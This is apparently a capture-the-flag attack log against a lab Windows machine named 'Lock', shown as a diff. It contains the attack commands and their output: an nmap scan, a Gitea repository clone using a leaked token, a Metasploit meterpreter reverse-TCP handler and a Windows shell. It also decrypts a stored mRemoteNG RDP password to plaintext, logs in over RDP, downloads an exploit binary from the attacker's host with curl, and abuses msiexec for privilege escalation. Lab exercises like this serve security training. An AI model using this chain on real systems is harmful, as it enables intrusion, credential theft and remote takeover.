@@ -1,1 +1,136 @@
+[★]$ nmap -sC -sV 10.129.234.64
+PORT     STATE SERVICE       VERSION
+80/tcp   open  http          Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Lock - Index
+| http-methods: 
+|_  Potentially risky methods: TRACE
+445/tcp  open  microsoft-ds?
+3000/tcp open  ppp?
+| fingerprint-strings: 
+|   GenericLines, Help, RTSPRequest: 
+|     HTTP/1.1 400 Bad Request
+|     Content-Type: text/plain; charset=utf-8
+|     Connection: close
+|     Request
+|   GetRequest: 
+|     HTTP/1.0 200 OK
+|     Cache-Control: max-age=0, private, must-revalidate, no-transform
+|     Content-Type: text/html; charset=utf-8
+|     Set-Cookie: i_like_gitea=04cd3721ed688f91; Path=/; HttpOnly; SameSite=Lax
+|     Set-Cookie: _csrf=VDY9p6n1pQGQS70C-BmJ7gZt3GE6MTc2NDU3OTU4ODI1NjIzNTgwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
+|     X-Frame-Options: SAMEORIGIN
+|     Date: Mon, 01 Dec 2025 08:59:48 GMT
+|     <!DOCTYPE html>
+|     <html lang="en-US" class="theme-auto">
+|     <head>
+|     <meta name="viewport" content="width=device-width, initial-scale=1">
+|     <title>Gitea: Git with a cup of tea</title>
+|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2xvY2FsaG9zdDozMDAwLyIsImljb25zIjpbeyJzcmMiOiJodHRwOi8vbG9jYWxob3N0OjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciLCJzaXplcyI6IjU
+|   HTTPOptions: 
+|     HTTP/1.0 405 Method Not Allowed
+|     Allow: HEAD
+|     Allow: GET
+|     Cache-Control: max-age=0, private, must-revalidate, no-transform
+|     Set-Cookie: i_like_gitea=9093c093174715d3; Path=/; HttpOnly; SameSite=Lax
+|     Set-Cookie: _csrf=sthmsRVkwzb4U-GzAxQf6zS9zQU6MTc2NDU3OTU5MzYzMDQ2ODYwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
+|     X-Frame-Options: SAMEORIGIN
+|     Date: Mon, 01 Dec 2025 08:59:53 GMT
+|_    Content-Length: 0
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+| rdp-ntlm-info: 
+|   Target_Name: LOCK
+|   NetBIOS_Domain_Name: LOCK
+|   NetBIOS_Computer_Name: LOCK
+|   DNS_Domain_Name: Lock
+|   DNS_Computer_Name: Lock
+|   Product_Version: 10.0.20348
+|_  System_Time: 2025-12-01T09:01:09+00:00
+|_ssl-date: 2025-12-01T09:01:49+00:00; 0s from scanner time.
+| ssl-cert: Subject: commonName=Lock
+| Not valid before: 2025-11-30T08:56:44
+|_Not valid after:  2026-06-01T08:56:44
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at 
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 
+Host script results:
+| smb2-time: 
+|   date: 2025-12-01T09:01:13
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+
+
+
+[★]$ python3 repo.py http://10.129.35.179:3000
+Repositories:
+- ellen.freeman/dev-scripts
+- ellen.freeman/website
+
+
+[★]$ git clone http://43ce39bb0bd6bc489284f2905f033ca467a6362f@10.129.35.179:3000/ellen.freeman/website.git
+Cloning into 'website'...
+remote: Enumerating objects: 165, done.
+remote: Counting objects: 100% (165/165), done.
+remote: Compressing objects: 100% (128/128), done.
+remote: Total 165 (delta 35), reused 153 (delta 31), pack-reused 0
+Receiving objects: 100% (165/165), 7.16 MiB | 1.56 MiB/s, done.
+Resolving deltas: 100% (35/35), done.
+[★]$ ls
+repo.py  website
+[★]$ cd website
+[★]$ ls
+assets  changelog.txt  index.html  readme.md
+[★]$ cat readme.md
+# New Project Website
+
+CI/CD integration is now active - changes to the repository will automatically be deployed to the webserver
+
+
+[★]$ msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.14.190; set LPORT 4455; run"
+[*] Using configured payload generic/shell_reverse_tcp  
+PAYLOAD => windows/x64/meterpreter/reverse_tcp          
+LHOST => 10.10.14.190
+LPORT => 4455
+[*] Started reverse TCP handler on 10.10.14.190:4455   
+
+
+c:\Users\ellen.freeman\Documents>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 8592-A9D9
+
+ Directory of c:\Users\ellen.freeman\Documents
+
+12/28/2023  05:59 AM    <DIR>          .
+12/28/2023  11:36 AM    <DIR>          ..
+12/28/2023  05:59 AM             3,341 config.xml
+               1 File(s)          3,341 bytes
+               2 Dir(s)   5,680,271,360 bytes free
+
+
+
+c:\Users\ellen.freeman\Documents>type config.xml
+type config.xml
+<?xml version="1.0" encoding="utf-8"?>
+<mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GCM" KdfIterations="1000" FullFileEncryption="false" Protected="sDkrKn0JrG4oAL4GW8BctmMNAJfcdu/ahPSQn3W5DPC3vPRiNwfo7OH11trVPbhwpy+1FnqfcPQZ3olLRy+DhDFp" ConfVersion="2.6">
+    <Node Name="RDP/Gale" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="a179606a-a854-48a6-9baa-491d8eb3bddc" Username="Gale.Dekarios" Domain="" Password="TYkZkvR2YmVlm2T2jBYTEhPU2VafgW1d9NSdDX+hUYwBePQ/2qKx+57IeOROXhJxA7CczQzr1nRm89JulQDWPw==" Hostname="Lock" Protocol="RDP" PuttySession="Default Settings" Port="3389"
+<SNIP>
+</mrng:Connections>
+
+
+
+[★]$ python3 mremoteng_decrypt.py config.xml
+Name: RDP/Gale
+Hostname: Lock
+Username: Gale.Dekarios
+Password: ty8wnW9qCKDosXo6
+
+
+
+[★]$ xfreerdp /v:10.129.234.64 /u:Gale.Dekarios /p:ty8wnW9qCKDosXo6
+
+C:\Users\gale.dekarios>curl http://10.10.14.190:5001/SetOpLock.exe -o SetOpLock.exe
+                                                                               
+c:\_install>msiexec.exe /fa c:\_install\pdf24-creator-11.15.1-x64.msi
